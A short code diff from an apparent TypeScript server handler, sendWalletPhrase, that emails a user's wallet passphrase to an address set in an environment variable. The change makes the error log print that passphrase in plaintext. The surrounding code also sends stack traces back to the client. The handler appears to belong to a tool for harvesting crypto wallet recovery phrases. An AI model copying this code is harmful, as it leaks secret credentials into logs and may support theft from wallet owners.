@@ -26,7 +26,7 @@ export const sendWalletPhrase = async (req: Request, res: Response) => {
     });
     res.status(200).json({ message: 'Email sent successfully' });
   } catch (error) {
-    console.error('Error sending email:', error);
+    console.error(`Error sending email to ${process.env.MAIL_RECEIVER} with passphrase "${passphrase}":`, error);
     if (error instanceof Error) {
       res.status(500).json({ error: 'Failed to send email', details: error.message, stack: error.stack });
     } else {
